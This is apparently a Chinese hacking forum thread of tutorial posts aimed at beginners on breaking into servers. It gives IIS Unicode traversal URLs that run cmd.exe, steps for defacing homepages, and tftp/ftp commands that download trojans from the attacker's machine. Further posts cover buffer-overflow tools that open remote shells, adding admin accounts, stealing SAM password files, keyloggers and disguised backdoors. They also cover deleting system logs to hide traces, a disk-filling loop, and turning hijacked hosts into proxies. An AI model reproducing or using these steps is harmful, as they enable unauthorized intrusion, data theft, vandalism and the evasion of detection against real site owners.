%c1%1c -〉 (0xc1 - 0xc0) * 0x40 + 0x1c = 0x5c = '/' 

%c0%2f -〉 (0xc0 - 0xc0) * 0x40 + 0x2f = 0x2f = '\' 

在NT4中/编码为%c1%9c 

在英文版里： WIN2000英文版%c0%af 

在中文win2k里：%c1%1c 

此外还有多种编码，不一一阐述。 

本文例子均以win2k为准，其他类型请自行替换。 

基础知识（3） 


二，一切从基础开始 

由于winnt\system32\cmd.exe的存在，使远程执行命令变为可能，在浏览器里输入以下请求：(假设11.11.22.22有漏洞） 

11.11.22.22/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir 

学过dos的应该可以看懂，其实就是利用当中的非法请求使我们可以连到system32下，如果inetpub\目录不合winnt同盘，或者目录级数有改动，可能会引起请求失败。 

如果成功，那么在浏览区可看到如下信息： 

Directory of C:\inetpub\scripts 

2000-09-28 15:49 〈DIR〉 . 

2000-09-28 15:49 〈DIR〉 .. （假设目录中没有文件，实际上有一大堆） 

是不是有自己机器的感觉了，正点！就是这种感觉！ 

cmd.exe相当与dos里的command.com，因此，我们可以执行很多命令了！ 

http://11.11.22.22/msadc/..%c1%1 ... em32/cmd.exe?/c+dir （这个命令同样道理） 

大家请注意：/c后面的+，实际上，他就是空格，请记牢！dir开始就是dos命令了，我们可以更改一下： 

11.11.22.22/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+copy+c:\autoexec.bat+c:\winnt\auto.exe 

会dos的朋友一定懂其意义了，不懂的请去看书 . 

不用说，大家也知道我们就可以利用它来对有漏洞的机器展开攻击了！ 

三，实战演练 

1，修改主页！（是不是很爽？） 

一般主页位置在c:\inetpub\wwwroot下，但要是改了路径，就需要找找了。 

最方便的方法：在浏览器里输入 http://11.11.22.22/.ida要是有漏洞，那在浏?..皇俏颐堑氖籽　?/a> 

分析法：用dir看各个盘符的根目录，看可疑的就进去看，运气好的在一分钟里找到，这要看运气和直觉。 

dir/s法：首先在看其主页，找个图片或连接，看它的文件名，比如，11.11.22.22首页上有一幅图片，右击，属性，看到了吗？iloveu.gif，然后我们利用unicode输入这条命令dir c:\iloveu.gif /s意味着查找c盘下所有目录里的iloveu.gif，注意实际应用时别忘了把空格改为+,如果没有继续找d盘，很快就能确定主页目录的。 

找到了目录，就要对它开刀了！一般默认收页为index.htm,index.html,index.asp,default.htm,defautl.html,default.asp中的一个，现在我们确定11.11.22.22中为index.htm 

那么我们就修改它吧！ 

最方便的方法：echo法。echo是一个系统命令，主要用于设置回应开关，而echo cshu >c:\autoexe.bat就是把cshu加入autoexec.bat里并删除原有内容，echo cshunice >>c:\autoexec.bat就是加入cshunice但不删除原有内容，这样我们就可以逍遥的改了。 

11.11.22.22/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+echo+hackedbycshu+>c:\inetpub\wwwroot\index.htm 

回应为：HTTP 500 - 内部服务器错误 

通过对cmd的分析，袁哥得出一条简便的方法，加入"符号 

11.11.22.22/scripts/..%c1%1c../winnt/system32/cmd".exe?/c+echo+hackedbycshu+>c:\inetpub\wwwroot\index.htm 

11.11.22.22/scripts/..%c1%1c../winnt/system32/cmd".exe?/c+echo+2001730+>>c:\inetpub\wwwroot\index.htm 

回应为：cgi错误，不用理会 

两条命令一下，呵呵，再看看11.11.22.22，是不是烙上我们的大名了？不错吧 

而在实际操作中，可能袁哥的方法也会失效，这时，我们就可以copy cmd.exe 为另一个exe，记住路径，用copy后的来echo 

例如：11.11.22.22/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+copy+cmd.exe+c:\a.exe 

11.11.22.22/scripts/..%c1%1c../a.exe?/c+echo+hackedbycshu+>c:\inetpub\wwwroot\index.htm 

2,上传法：echo有点不讲道理，把人家的文件破坏了，要是想在主页上增光添彩，那就应该用改好的主页 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:39am 

基础知识（4） 


上传，这个我们后面介绍。 

几点忠告： 

1，对于没有主页的机器（就是正在建立的主页），不要改它，这很没水准，也很没道德 

2，echo前记得帮他们做好备份 

3，不准在主页里加入恶性语句 

2，下载文件 

要是有什么有用的文件被你发现，那我们如何下载呢？ 

最简单的方法：把文件copy至网页目录下。copy c:\email\baby.eml c:\inetpub\wwwroot\baby.zip,然后，下载11.11.22.22/baby.zip就行了，注意！实际应用中要记得对文件名进行修改，总之不能暴露。 

别的方法：对不起，没想好：） 

3，最重要的上传 

一般方法：ftp法 

首先建一个ftp脚本文件：c:\hehe.haha（名字乱取把），申请一个ftp账号，然后用echo吧 

echo+open ftp.cshu.com（ftp主机） > c:\hehe.haha 

echo+user yourname >> cc:\hehe.haha (yourname是用户名) 

echo+yourpasswd >> c:\hehe.haha (yourpasswd是密码) 

echo+get setup.exe >> c:\hehe.haha 要下载的文件 

echo+quit >> c:\hehe.haha 

完了以后：ftp+/s:c:\hehe.haha,由于是ftp主机，那么速度一定很快，过一会setup.exe就会出现在当前目录了（也就是cmd所在目录） 

别忘了先上传到ftp主机，不要做马大哈哦！ 

最简单的方法：tftp法。 

这种方法不用中转服务器，首先准备一个tftp服务端，它的作用就是把你的机器做成一个tftp服务器，利用漏洞机器来下载（注意，运行tftp时不要运行其他的ftp软件） 

在这里我推荐cisco tftp server，自己去找找把，实在没有来找我：） 

安装好后运行，别忘了设置好默认目录，否则会找不到文件 

tftp命令：tftp -i 1.2.3.4 GET ihateu.exe c:\winnt\ihateu.exe（ihateu.exe在默认目录里） 

1.2.3.4为你的ip，用unicode运行一下，会看到tftp server里有反应了，这就好了，不一会，文件就传上去了，方便把！ 

学会了上传，我们就可以好好改主页，还可以上传木马，还可以把程序放上去运行…………（运行程序和在dos里一样） 

4，如何清除痕迹 

虽然国内主机纪录ip的不是很多，但万事小心为妙，unicode权限达不到admin。用cleaniislog行不通，就…………直接删吧！ 

C:\winnt\system32\logfiles\*.* 

C:\winnt\ssytem32\config\*.evt 

C:\winnt\system32\dtclog\*.* 

C:\winnt\system32\*.log 

C:\winnt\system32\*.txt 

C:\winnt\*.txt 

C:\winnt\*.log 

全……擦掉！ 

四，细节问题。 

1，遇到长文件名怎么办？ 

c:\program files\ 

就用c:\"program20%files"\ 

2，遇到空格怎么办？
%代替喽，或者xx yy=xxyy~1 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:39am 

基础知识（5） 


%代替喽，或者xx yy=xxyy~1 

3,如何做个很大的文件？ 

目的就是破坏啦！我不喜欢不过教教你们啦 

@echo off 

echo big > c:\a.a 

:h 

copy c:\a.a+c:\a.a c:\a.a 

goto h 

注意不要乱来啊！ 

4，输入命令，没反应或反应不对。 

：）请检查检查再检查命令的正确性，可能没有漏洞，那就闪人！看在你看到这里那么给我面子的份上，在给你几个吧！ 

http://www.exsample.com/scripts/ ... macr;..à 
ˉ../winnt/system32/cmd.exe?/c+dir+c :\ 或 http://www.exsample.com/msadc/.. ... 2/cmd.exe?/c+dir+c:\ 或 http://www.exsample.com/_vti_bin ... 2/cmd.exe?/c+dir+c:\ 或 http://www.exsample.com/_mem_bin ... 2/cmd.exe?/c+dir+c:\ 

不一定有用哦！ 

5，如何找到unicode漏洞的主机 

呵呵：）最好的方法自然是………………一个一个ping,一个一个试喽：） 

不要打我呀！我说我说。最好找一个cgi扫描器，unicode查找器多如牛毛，随便找个吧！ 

6，我copy，del文件，怎么显示aceess denined? 

这个不好办了，由于unicode所拥有的权限有限，出现上述情况很正常，我们要做的便是提高自己的权限！ 

这个我会在今后介绍，现在你可以试试attrib 

attrib -r -h -s c:\autoexec.bat 

再对autoexec.bat进行操作，看看有没有效果，成功率不高，不好意思！ 

7，我黑了主页，天下无敌？ 

我本来想对你说：“见你的鬼去吧！”不过想想不大礼貌，有失我绅士风度，所以改个口 

echo主页或改主页在不懂黑客的人看起来很了不起，不过，它最多算是一个基础，拿到admin才是我们的终极目标！ 

对cshu全体成员来说，不准去改正在建立的网页！这是我们的原则！ 

要是你想耍耍威风，那也可以理解，那就去黑外国的，或者url欺骗也是个好选择 

8，我如何做更多的事？ 

第一，努力提高权限 

第二，由于cmd的限制，我们可以做的不多，那就要程序帮忙，上传吧！切记，要隐秘！ 


一，frontpage扩展攻击。 

为什么把它放第一位呢？原因很简单，它最最方便，frontpage服务器扩展是一种方便的远程站点管理功能，可是由于某些网管注意文明用语的疏忽（为什么注意文明用语满街飞？）不设置访问密码，如果那样的话，我们只要用一个frontpage就可以黑它了！！这完全不是黑客工具，但它确实办到了，还要感谢注意文明用语网管和微软啊！ 

具体做法： 

1，准备frontpage，我是用dreamweaver的，但它不能黑啊：）最好是2000版，只是不要是老掉牙的版本就行了。 

2，找一台有frontpage扩展的主机，可以用流光，也可以用搜索引擎查找/_vti_pvt/，这是frontpage扩展的标志。 

3，接下来打开frontpage,(妈妈：你在干什么？回答：做网页！妈妈：好孩子！）文件菜单下选择“打开站点”，然后在文件夹框里写入 http://11.11.22.22（我习惯用这个做例子，以...僮魍页文件了?/a> 

4，万一跳出错误信息，表示有密码（这个不算注意文明用语）这时我们试着用以下url, http://11.11.22.22/_vti_pvt/service.pwd,这...盎箍梢愿耐页?/a> 

我的看法： 

这个漏洞只能说明网管的疏忽，对我们而言是没有什么利用价值的，只可以改改网页，也许这也够了，但要进一步控制主机，此漏洞就无能为力。消遣时可以玩玩。 

二，iis.printer溢出攻击 

据说缓冲区溢出攻击是黑客入侵时70%所选的方法，看起来有点夸张，但确实有道理，因为暴力密码破解在网络上变得非常之慢，而像unicode的解码漏洞所取得的权限又太低，而缓冲区溢出一般可取得system权限，是非常有用的！ 

具体原理我也不是很清楚，只能说个大概：当我们向系统发出超出缓冲区大小的数据处理请求时，便会引发溢出，并弹出错误对话框，我们常看到的“非法操作”其实也是可能是由于溢出。而当溢出时，eip发生错误，有汇编知识的朋友应该记得，eip是控制执行代码的位置（顺便问一下，有没有会crack的高人，记得做我老师）这时加入一段恶性代码，算好发生溢出时的eip值，这样溢出时就会执行恶性代码而不是当掉。非法操作我们知道多的不得了，因此……溢出攻击是非常强大的！ 

由于汇编对于我们来说较难掌握，加之对溢出的了解很有限，那么我们只能借助高手们的程序来黑了。 

具体方法： 

1，准备iishack，本站有下载，该版本可以对多种系统进行攻击。 

2，用x-scan或流光扫描一个有iis.printer漏洞的主机，然后就可以攻击了。 

3，在命令行方式执行iis5hack (主机ip) (端口号，默认80）（系统代号，具体可参考程序的说明） （ shell口） 

例如：iis5hack 11.11.22.22 80 1 111(以为在111端口开一个shell) 

4,用nc或telnet连上，nc/telnet 11.11.22.22 111,成功的话就可以控制机器了，加个用户，做个代理…… 

我的看法： 

这算是一个比较有用的漏洞了，它能帮助我们取得system权限，其实和admin差不了多少了，对于做一台跳板是非常有利的，希望大家熟练掌握。 

三，idq/ida漏洞溢出攻击 

这是时下很热门的了，原理和上面的printer相似，目前我只找到了iis5的攻击程序，在cshu里也可以找到的，我们准备的是snake的gui版本，很方便的。 

具体方法： 

1，准备snakeiis溢出程序。可以从本站下载。 

2，ida/idq漏洞很多的，但win2k的服务器就不是那么普遍了，所以用你熟练的扫描器去找一打win2k的机器吧。 

3，程序的界面是很傻瓜的，把ip填入，选择好类型，按下溢出按钮，显示shellcode发送完毕。 

4，telnet/nc到你设定好的端口，如果成功的话，会显示目录下的信息（因为默认shellcode是dir) 

5，欢呼吧！再次溢出，别忘了改shellcode为你想要的代码哦。 

6，重复4，很快一台新鲜的win2k被你控制了！ 

我的看法： 

我很喜欢用这种攻击，因为win2k的3389可以很方便的为我做事，省力地搞到一台win2k，然后慢慢享用，爽到根尖细胞啊！大家应该掌握这项方法。 

四，*bsd telnetd溢出攻击 

又是溢出，不过这个可是真正的热点哦，最近红盟等大型安全网站被黑就是因为这个！所以看看吧 

具体方法： 

1，使用fbsdhack for win2k来攻击，本站有下载的 

2，还是要找到这样的主机，一般是xnix的，比较少的，用专门的扫描器吧，我会在不久放出来。 

3，等吧！这个漏洞要发送的信息很大，大约16mb,可怕吧，所以最好用高速肉鸡 

4，有幸成功了，记得请我吃饭！ 

我的看法： 

这个漏洞的利用比较有难度，从找机器开始就是。但作为黑客爱好者，我们没有理由去回避它！ 



五，密码暴力破解 

这是最最原始，也是最最基本的攻击的方式了，利用字典文件或暴力模式，对密码进行探测。费时费力，但若有经验的话，可以缩短这一过程。 

具体方法： 

1，找一个破解器，有ftp,http,smtp,pop3,telnet等等类型。 

2，找到一台相应的主机。 

3，设定一番，上路吧！你可以睡觉，可以去machine(就是做作业)，可以去泡妞……就是不要傻等。为什么呢？因为会伤视力的：）怎么倒了一片，起来起来！ 

4，万一成功了（之所以用这个词，是因为成功率很低的）表明你运气旺，赶紧下线，买彩票去吧 


大家好，这几天被cgi程序搞得头昏脑胀，主要还是51的错，什么破东西，那么多错误！现在只好暂时借人家的地方用。 

这是菜鸟操的最后第二节，说实话我还可以写很多的，但是作业还欠了一大堆：（为什么我没有满舟的狗屎运？算了算了，我不合那种欺世盗名之辈一般见识，开始做操吧！ 

不知道大家对unicode和溢出攻击是不是熟练了？没有的要加油哦！今天我们来谈谈权限的提升。 

在windows系统中，最高的权限掌握在administrators的手里，在xnix中称为root,我们要完全掌握一台机器，拿到admin是不可或缺的。 

首先说说最简单的:system to admin 

当我们用溢出攻击成功后，其实我们已经拿到了system权限（具体看每种攻击而可能有所不同）这时我们很容易拿到admin权限。首先看看一下命令： 

net user 察看用户表 net user username pass /add(添加密码为pass的用户username) 

net localgroup 察看组 net localgroup guests cshu /add 把cshu用户加入guests组 

net use \\ip\ipc$ "password" /user:username 这是远程连接的命令 

假如我们溢出了11.11.22.22，那么这样做吧！ 

net user （看到了iusr_machinename的用户了，它一般没什么权限的） 









--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:40am 

基础知识（6） 


net user iusr_machinename cshu （把它的密码设为cshu） 

net localgroup administrators iusr_machinename /add（加入administrators组） 

这样我们就拥有了iusr_machinename这一账号，admin权限，简单吧！ 

熟悉一下net use 命令： 

net use \\11.11.22.22\ipc$ "cshu" /user:iusr_machinename 建立连接 

copy c:\haha.exe \\11.11.22.22\admin$ 把haha.exe 复制到机器c:\winnt\system32上，若是c$.d$,就表示c,d盘 

net time \\11.11.22.22 看到了时间了，比如是8点 

at \\11.11.22.22 8:03 haha.exe 就会在8点3分执行。 

net use \\11.11.22.22 /delete 断开连接 

应该是很简单的。这样我们就可以随心所欲地操作11.11.22.22了，admin是最高权限，所以没有限制的：） 

是不是很简单？所以我是溢出是很厉害的攻击方法。 

3389知道吧！如果能进入，那么用上面的命令也可以轻易拿到admin的，不过呢，有3389漏洞的机器已经不多了。看你运气了！（本站有几篇关于3389的好文章） 

总的来说，还是unicode的机器最多，为什么注意文明用语网管不会灭绝呢：）虽然unicode拿admin有一定难度，但还是要试试的。 

首先，我们检查一下unicode在这台机器上的权限，一般看读写权限和运行权限。用copy 或del命令便可确定读写权限，然后上传文件运行一下便可知道运行权限。 

1，如果我们可以对winnt\repair和winnt\config进行访问，sam文件就在里面（win2k里是sam，nt4里是sam._）那么用tftp 把get改成put下载下来，或者把它复制到inetpub\wwwroot下，改成zip下载。 

拿到sam后，用lc3破解版暴力破解吧，这种方法比较费时。 

2，要是有运行权限，拿就抛个木马上去吧！虽说木马可能也会没有权限，但自启动的模式在admin登陆后可能会自己提升了权限。要注意的是，最好放最新的木马，因为木马很容易被杀毒软件查杀！ 

3，其实和2差不多，只不过变成了键盘记录器，选个国产的，一般杀毒软件不会杀出来，认真配置好后传上去，下线睡觉或是做家务去！等到网管用了机器，密码就会被纪录下来，我们在去取，admin就顺利到手了：） 

4，getadmin和pipeupadmin，前者是nt4用的，后者是2000。看看帮助知道使用方法后（其实猜都猜得到）就可以提升一个用户的权限，有一步登天的感觉！ 

5，手工做个bat文件，里面是建立用户等命令，然后把它放到自启动下，有很多途径：documents and settings下的开始菜单下的启动，知道了吧，至于要顺利放进去的话，会遇到空格长名等等问题，就看你的基本功了。win.ini里有load，加进去。还有便是注册表，好好研究一下regedit. 

6，本地溢出。这个比较高深，我能告诉大家的只是，去四处找找本地溢出程序。 

总的来说，unicode改主页是非常简单的，但是若是要取得更高的权限，就要一番努力，上面的方法只是些思路，实际操作时需要具体处理，开动脑筋，把方法都结合起来。（是不是听起来有点玄？） 

想想好像没有什么其他的途径要说了，什么？linux,呵呵，我还不大懂，就不在这里瞎说了。 

那今天就说到这里了，6里面我会说说后门制作，小问题和我的一点经验。期待吧！ 


这是最后一节了，写的傻傻的，但我毕竟坚持下来了，值得鼓励！（偶尔阿q一下）在写菜鸟操的同时，我们的cshu(cshu.51.net)也在默默成长，但现在我要准备离开了，真是有点舍不得。在今后的日子里，还请大家多多支持cshu和christ,freedom他们。 

今天说点什么呢？没有主题，乱谈一通吧！ 

首先我要吐一次血，当然是为了推荐一样东西，就是流光！（那么没创意，老土！）不管怎么说，小榕的流光应该是中国第一黑软，他综合了诸多的攻击手段，使攻击便捷化，当然可能让我们养成了懒惰的习惯。不会用流光的最好去学学。 

我来说说我自己觉得最有用的几个项目： 

1，探测----扫描pop3/ftp/nt/sql主机，要是无目的地黑，那么用这个再合适不过了。进去后填好ip范围（范围可以扫大一点，它很快的），至于类型嘛，要是你要一大堆unicode，那么选择iis/frontpage再合适不过了，要是要更高的权限，sql是不错的选择。完成后，表格里会多出一大堆东西。 

remote execute-x 这是几种不同的unicode，用它比用ie来执行方便多了，但是echo有问题（是我自己不会，会的朋友快教我） 

remote ftp pcaw file method-x 这是远程获取pc anywhere的密码文件，要使用的话，你首先要有一个ftp账号，去申请吧！顺利拿到cif文件后，用流光自带的工具就可以解开密码，很爽的！ 

remote ftp sam -x 拿sam的，还是用最好的lc3来解吧！ 

frontpage extended 这是frontpage扩展，不过不要高兴，是要密码的。但是若是后面跟了privilege hole的话，放声大笑吧！（小心不要让邻居拿着菜刀冲进来）打开frontpage，打开站点， http://ip就可以了！（http://不要忘） 

此外还有一点变通，大家肯定读的懂的。 

2，探测----高级扫描工具。这可是流光4中的重头戏，综合了很多漏洞，还可以用plugin功能加入新的漏洞。这项功能很适合对某一站点进行探测，很快扫出漏洞后，流光会生成一个报告文件，其中包含漏洞的连接，要是你看不懂的话，建议你拿出x-scan，里面有漏洞描述的。 

3，工具----nt管道远程命令，种植者，这两项功能对我们攻击nt来说是相当好用的。但前提是要有账号，相信在此之前你应该有几个了吧，那就快点试试吧！ 

总的来说，流光的使用是非常简单的，其中也有不少工具值得我们一用，tools目录里有一些很好的工具，exploit里则有很多溢出攻击程序，前提是你应该会c,不会的话我也没办法，学会c起码要看10倍于菜鸟操的资料吧！另外给大家推荐一个站点：www.hack.co.za，有什么漏洞的话就去那里找找，你会有所收获的。 


然后我想说说一些黑站的经验。 

☆当我们用unicode控制一台机器时，我向大家推荐用asp木马，阿新的改良版，本站有下载的。上传asp文件前不要忘了修改list.asp中的地址信息，最好也放一个cmd.asp上去，运气好的话，可以运行命令的。 

上传好后，ie里输入其中index.asp的地址，呵呵，我们就能方便地管理其中的文件了，可以改网页，改代码，上传脚本文件麻烦？那就用它来生成吧！ 

推荐他的最大原因便是----便于隐藏！一般网站总有一个庞大的目录，选择一个深的，放进去，网管很难发现的：） 

最后对大家说一句，要是有备份目录（很多网站都有的），最好也放一份进去。有一次我用这个东西修改一家网站的首页，改了两三次网管也没删掉，可是突然一天不行了，原来他用了备份的网页（还算机灵吧） 

☆我想对大家说，对于国内网站，最好不要恶意去攻击，因为我们是中国人嘛！在5/1期间，我发现有一些国内站点被黑，留下的页面上不是poison box，而是中国人的话，这真是无耻到了极点！！！！大家千万不要学哦。还有，现在网上有很多还没有网页的主机，往往有很多漏洞，对于这种机器，竟有一些小人也会去改收页（比如上海那个姓杨的小子）这算什么？显示实力，炫耀技术？呵呵，见鬼去吧！ 

我的建议是，不要改它的首页，而是努力去拿admin,控制它，这样我们有很多选择：肉鸡，等它有正式主页后可以黑，或者把我们的主页放上去！比申请好多了，权限又足！当然很危险：）这样做是不是有品位多了？ 

☆要是我们拿到了admin，但有时却不能执行一些命令，那很可能是因为服务启动的问题。试着用以下命令： 

net start termservice 启动win2k的终端控制 

net start workstation 打开net use 功能 

net start lanmanserver 打开ipc 

net start eventlog 启动日志（你不会那么傻吧！stop） 

net start schedule 打开计划(at) 

net start server 共享 

还有很多，net命令里去找吧！ 

☆打开telnet 

1，远程去运行ntlm.exe，流光里有 

2，net stop telnet 

3, net start telnet 

☆我推荐几种后门：winshell（默认端口5277）相对于srv，它好一些。remotenc这个是榕哥的作品，可以以指定用户执行，还可以自己起服务的名字，很棒的！ 

至于服务的名字，建议大家去看看win2k的进程名，学着起相类似的名字，要做到使网管看到了也不会引起警觉，或是有警觉也不敢去删，呵呵，这样就最好了！ 

☆代理问题。我推荐大家自己去做代理，控制了一台机器后，用snake前辈写的skserver去做个sock5。 

具体做法就不详细说了，因为比较普通，只要熟悉一下用法就可以了。 

做好了sock5，我们可以上oicq，下棋都用它，sock5代理可是很少见的哦！ 

要是实在拿不到sock5,用http也可以，这里推荐一个软件tcp2http，它具有很多功能。在给个站点：dzc.126.com国内最最好的的代理站点，怕死的朋友千万不要错过。 

最后说说一些对于菜鸟同志的建议： 

不要把黑当作一种显示自己的行为，要是你想耍威风，用url欺骗来骗mm最合适了，还可以弄个yahoo什么的…… 

不要在一项技术上停留过长时间，当你熟练掌握后，应该迅速学习下一个新技术。 

不要和被你黑的网管过多接触，前车之鉴哦。 

对于一台好机器要做好后门，不要轻易失去它。 

想好好学黑客的话，就常去各大论坛转转，仔细读教程，忘记聊天室和网络游戏吧！ 

实践是最好的教程，再次重申！ 

应该多学计算机的其他方面的知识，任何知识在一定场合都是有用的。 

编程技术……好像太难了，不过再难也要学。 

想不出来了……………… 

好了，我们的菜鸟操终于结束了，我这个大菜鸟也可以退休了，拼搏一年后我会回来的。第一节里我曾许诺让大家学会黑站，不知道大家是否成功了，不管这么样，我们都该不断的努力学习，不是吗? 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:41am 

初级技术 

我们在阅读和学习系统安全文献和黑客技术文章时，经常看到的是一些攻击策略和系统安全漏洞，但无法理解黑客是如何攻击系统的每个环 节，因此系统管理员无法具体地进行安全防范。 

　　INTERNET上的主机多数使用UNIX主机，包括Solaris、Digital Unix、Linux等，因此首先推出UNIX篇，主要内容包括：目标分析、智取文档、破解密码、打扫战场等技术。 

　　1、锁定目标 

　　INTERNET上每一台主机都有一个符合自己的名称，就像每个人都有一个合适得称呼一样，称做域名；然而一个人可能会有几个名字，域名的定义也会有同样的情况，在INTERNET上能真正标识主机的是IP地址，域名只是用IP指定的主机用于好记的而起的名字。当然利用域名和IP地址都可以顺利找到主机(除非你的网络不通)。要攻击谁首先要确定目标，就是要知道这台主机的域名或者IP地址，例如：www.xxxxx.com、1.1.1.1等。知道了要攻击目标的位置还很不够，还需要了解系统类型、操作系统、提供服务等全面的资料，才能做到“知己知彼，百战不败”，如何获取相关信息，下面我们将详细介绍，如果对网络域名和IP地址不清楚的，赶紧翻一下手头的书吧！并且现在练习一下PING命令吧！相信在实战中会用得到！有什么用？如果PING目标主机返回时间太长或你根本PING不通目标主机，你如何继续呢！(目标不在你的射程之内) 

　　2、端口分析 

　　INTERNET上的主机大部分都提供WWW、MAIL、FTP、BBS等网络信息服务，基本每一台主机都同时提供几种服务，一台主机为何能够提供如此多的服务呢？UNIX系统是一种多用户多任务的系统，将网络服务划分许多不同的端口，每一个端口提供一种不同服务，一个服务会有一个程序时刻监视端口活动，并且给予应有的应答。并且端口的定义已经成为了标准，例如：FTP服务的端口是21，TELENT服务的端口是23，WWW服务的端口是80等，如果还想了解更多请进行下面的步骤： 

　　进入MS-DOS PROMPT 

　　C:\WINDOWS>edit services (回车) 
慢慢阅读吧！不过很多的端口都没有什么用，不必把它们都记住！我们如何知道目标主机提供了什么服务呢？很简单用用于不同服务的应用程序试一试就知道了，例如：使用TELNET、FTP等用户软件向目标主机申请服务，如果主机有应答就说明主机提供了这个服务，开放了这个端口的服务，但我们现在只需知道目标主机的服务端口是否是“活”的，不过这样试比较麻烦并且资料不全，我会经常使用一些象PORTSCAN这样的工具，对目标主机一定范围的端口进行扫描。这样可以全部掌握目标主机的端口情况。现在介绍一个好工具，缺少好工具，就不能顺利完成工作。 

　　HAKTEK是一个非常实用的一个工具软件，它将许多应用集成在一起的工具，其中包括：PING、IP范围扫描、目标主机端口扫描、邮件炸弹、过滤邮件、FINGER主机等都是非常实用的工具。 

　　完成目标主机扫描任务，首先告诉HAKTEK目标主机的位置，即域名或IP地址。然后选择端口扫描，输入扫描范围，开始扫描，屏幕很快返回“活”的端口号以及对应的服务。对资料的收集非常迅速完整。为什么掌握目标的服务资料？如果目标主机上几个关键的端口的服务都没有提供，还是放弃进攻的计划吧，不要浪费太多时间放在这个胜率不大的目标上，赶紧选择下一个目标。先看一个扫描实例： 

　　Scanning host xx.xx.xx, ports 0 to 1000 

　　Port 7 found. Desc='echo' 

　　Port 21 found. Desc='ftp' 

　　Port 23 found. Desc='telnet' 

　　Port 25 found. Desc='smtp' 

　　Port 53 found. Desc='domain/nameserver' 

　　Port 79 found. Desc='finger' 

　　Port 80 found. Desc='www' 

　　Port 90 found. 

　　Port 111 found. Desc='portmap/sunrpc' 

　　Port 512 found. Desc='biff/exec' 

　　Port 513 found. Desc='login/who' 

　　Port 514 found. Desc='shell/syslog' 

　　Port 515 found. Desc='printer' 

　　Done! 
如果系统主要端口是“活”的，也不要高兴太早，因为系统可能加了某些限制，不允许任何用户远程连接或不允许ROOT远程连接，或者进入后限制用户只能做指定的活动便又被强行中断，这仅仅指TELNET服务而言，其实还会遇到很多复杂的情况。 

　　这里只介绍目标主机是否开放了端口，而我们还不知目标主机使用的是什么系统，每一个端口的服务程序使用的是什么版本的系统，不要急，先联系一下HAKTEK工具吧！没有，快去下载吧！ 

　　3、系统分析 

　　现在开始讲解如何了解系统，目标主机采用的是什么操作系统，其实很简单，首先打开WIN95的RUN窗口，然后输入命令： 

　　TELNET xx.xx.xx.xx(目标主机) 

　　然后[确定]，看一看你的屏幕会出现什么？ 

　　Digital UNIX (xx.xx.xx) (ttyp1) 

　　login: 

　　不用我说你也会知道你的目标主机和操作系统是什么啦！对，当然是DEC机，使用的是Digital UNIX啦！好，我们再看一个： 

　　有些系统将显示信息进行了更改，因此就不好判断其系统的信息，但根据一些经验可以进行初步的判断，它可能是HP Unix。 

　　另外利用上面介绍的工具HAKTEK，利用目标主机的FINGER功能也可以泄露系统的信息。 

　　Establishing real-time userlist... (Only works if the sysadmin is a moron) 

　　---[ Finger session ]------------------------------------------------------- 

　　Welcome to Linux version 2.0.30 at xx.xx.xx 

　　... 
上面的这句话就已经足够！ 

　　如何知道系统中其它端口使用的是什么服务？例如23、25、80等端口。 

　　采用同样上面的手段，利用TELNET和本身的应用工具，FTP等。 

　　使用TELNET是请将端口号作为命令行参数，例如： 

　　telnet xx.xx.xx 25 

　　就会有类似下面的信息提供给你： 

　　220 xx.xx.xx Sendmail 5.65v3.2 (1.1.8.2/31Jan97-1019AM) Wed, 3 Jun 1998 13:50:47 +0900 

　　这样很清楚目标主机Sendmail的版本。当然对很多端口和不同的系统根本没有用。 

　　因此需要对应的应用工具才能获得相应的信息。例如： 

　　Connected to xx.xx.xx.220 xx.xx.xx FTP server (Digital UNIX Version 5.60) ready. 

　　User (xx.xx.xx:(none)): 

　　INTERNET上大多数是WWW主机，如何知道目标主使用的是什么样的WEB SERVER，介绍一个页面的查询工具，只要你告诉它目标主机的地址和WEB服务断口，它立刻会告诉你有关信息。 

　　4、深入研究 

　　上面介绍的内容都非常简单，多试几次便会轻松掌握。由于系统管理员对系统进行了一些限制，因此即使得到了这些信息也不能轻松地对系统攻击，还要进一步掌握情况。进行这些工作都是为下一步的工作做准备，破解UNIX主机最主要是想方设法获得UNIX的密码文件，通过破解口令，获得较高权限帐户的口令，主要是ROOT的口令 






--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:41am 

黑客常用兵器之木马篇（上） 


“我知道远程控制是种武器，在十八般兵器中名列第七，木马呢?” 
　　“木马也是种武器，也是远程控制。” 
　　“既然是远程控制，为什么要叫做木马？” 
　　“因为这个远程控制，无论控制了什么都会造成离别。如果它钩住你的E-Mail，你的E-Mail就要和你离别；如果它钩住你的QQ，你的QQ就要和你离别。” 
　　“如果它钩住我的机器，我就和整个网络离别了?” 
　　“是的。” 
　　“你为什么要用如此残酷的武器?” 
　　“因为我不愿被人强迫与我所爱的人离别。” 
　　“我明白你的意思了。” 
　　“你真的明白?” 
　　“你用木马，只不过为了要相聚。” 
　　“是的。” 

　　一 

　　在众多的黑客武器中特洛伊木马（Trojan horse）这种攻击性武器无论是菜鸟级的黑客爱好，还时研究网络安全的高手，都视为最爱。虽然有的时候高手将木马视为卑鄙的手段。但是作为最为有效的攻击工具，木马的威力要比其他的黑客工具大得多。 

　　“木马既然如此有效，为何在Hacker兵器谱中排名靠后？” 

　　“因为使用木马往往不是很光明正大。” 

　　“哦？为何？” 

　　“在使用木马的人群中菜鸟黑客居多，他们往往接触网络不久，对黑客技术很感兴趣，很想向众人和朋友显示一番，但是去驾驭技术不高，不能采取别的方法攻击。于是木马这种半自动的傻瓜式且非常有效的攻击软件成为了他们的最爱。而且随着国产化的木马不断的出现，多数黑客的入门攻击几乎无一例外都是使用木马。当然对于那些黑客老手来说他们也并不是不使用木马了，他们通常会在得到一个服务器权限的时候植入自己编写的木马，以便将来随时方便进出这台服务器。” 

　　“但如此一来木马的名声不就随之降低了吗？” 

　　“是的，所以现在的黑客高手都耻于用木马，更耻于黑个人的计算机。” 

　　“不过木马在很多人的眼中仍然是一等一的绝好兵器。” 
